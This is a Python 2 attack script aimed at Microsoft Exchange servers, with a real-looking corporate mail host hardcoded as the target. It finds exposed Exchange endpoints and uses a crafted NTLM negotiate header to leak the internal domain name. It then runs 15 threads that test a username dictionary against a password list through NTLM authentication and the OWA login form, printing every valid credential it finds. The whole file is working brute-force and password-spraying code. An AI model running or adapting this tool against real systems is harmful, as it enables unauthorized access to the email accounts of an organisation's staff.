import base64
import requests
import urllib
import logging
# from urlparse import urljoin
from requests_ntlm import HttpNtlmAuth
from colorama import Fore
import argparse
import threading
import Queue

oauth = []
requests.packages.urllib3.disable_warnings()
users = []
queue = Queue.Queue()

with open('user_dic.txt') as inFile:
    while True:
        user = inFile.readline().strip()
        if len(user) == 0: break
        queue.put(user)
for i in range(15):
    queue.put(None)

passwords = []
with open('pass_dic.txt') as inFile:
    while True:
        pwd = inFile.readline().strip()
        if len(pwd) == 0: break
        passwords.append(pwd)

headers = {
    'Accept': '*/*',
    'Accept-Language': 'zh-CN',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; ',
    'Connection': 'Keep-Alive',
    'Cache-Control': 'no-cache',
    'Cookie': '',
}

loginapi = [
    '/ews','/oab','/mapi','/rpc','/ecp',
    '/Microsoft-Server-ActiveSync','/autodiscover/autodiscover.xml']

lock = threading.Lock()
def ntmchallenge(hostInput):
    brust = harvestInternalDomain(hostInput)
    # url = urljoin("https://" + hostInput,loginapi[2])
    headers['Authorization'] ='NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=='
    urlToHarvest = requests.get(url=oauth[0], verify=False, timeout=3,headers=headers)
    challenge = urlToHarvest.headers.get('WWW-Authenticate').split(' ')
    challengeBytes = base64.b64decode(challenge[1].strip(','))
    if not challengeBytes[:8] == b'NTLMSSP\x00':
        raise Exception("NTLMSSP header not found at start of input string")
    base64DecodedResp = bytearray(challengeBytes)
    base64Resp = bytearray('')
    continueAppending = ''
    for decimalValue in base64DecodedResp:
        if decimalValue == 0:
            continue
        if decimalValue == 2:
            continueAppending = False
        if continueAppending:
            base64Resp.append(decimalValue)
        if decimalValue == 15:
            continueAppending = True
            continue
    # print '[+] Attempting to harvest internal domain: ' + \
    #     base64Resp.decode(encoding='utf-8')
    return base64Resp

def harvestInternalDomain(hostInput):
    # print '[+] Identifying exposed Exchange endpoints for potential spraying: '
    for login_ in loginapi:
        uri = "https://" + hostInput + login_
        passEndpoints401 = requests.get(url=uri, verify=False, timeout=3)
        if passEndpoints401.status_code == 200 or passEndpoints401.headers.get('WWW-Authenticate'):
            oauth.append(uri)

def owaburst(host):
    for user in users:
        for pwd in passwords:
            pwd = pwd.replace('<user>', user)
            # logging.warning(user + " " + pwd)
            owa_url = "https://" + host+ '/owa/auth.owa'
            data = {'destination': 'https://%s/owa/' % host,
                    'flags': '0', 'forcedownlevel': '0', 'trusted': '0',
                    'username': user, 'password': pwd,
                    'isUtf8': '1', }
            # proxies = {'http': 'http://localhost:8888', 'https': 'http://localhost:8081'}
            burst = requests.post(owa_url,data=urllib.urlencode(data), headers=headers,verify=False,allow_redirects=False)
            if dict(burst.headers)['Location'].find('reason=') < 0 :
                print "SUCCESSFUL LOGIN." + (ntmchallenge(host)) + "\\" + user + ": " + pwd
                break

def brust(host):
    '''
    :param host:
    :return:
    '''
    while True:
        user = queue.get()
        if user == None:
            queue.task_done()
            break
        for pwd in passwords:
            pwd = pwd.replace('<user>', user)
            # logging.warning(user + " " + pwd)
            # proxies = {'http': 'http://localhost:8888', 'https': 'http://localhost:8081'}
            auth = requests.get(host, auth=HttpNtlmAuth(user, pwd), verify=False)
            if auth.status_code == 200 :
                lock.acquire()
                print(Fore.GREEN + " [+] SUCCESSFUL LOGIN." + "\\" + user + ": " + pwd)
                lock.release()


if __name__ == '__main__':

    hostinput = 'email.htsc.com'
    print '[+] Attempting to harvest internal domain: ' + ntmchallenge(hostinput)
    # print '[+] Identifying exposed Exchange endpoints for potential spraying : '
    for url in oauth:
        print "[+] " + url
    threads = []
    for i in range(15):
        t = threading.Thread(target=brust,args=(oauth[0],))
        t.start()
    for t in threads:
        t.join()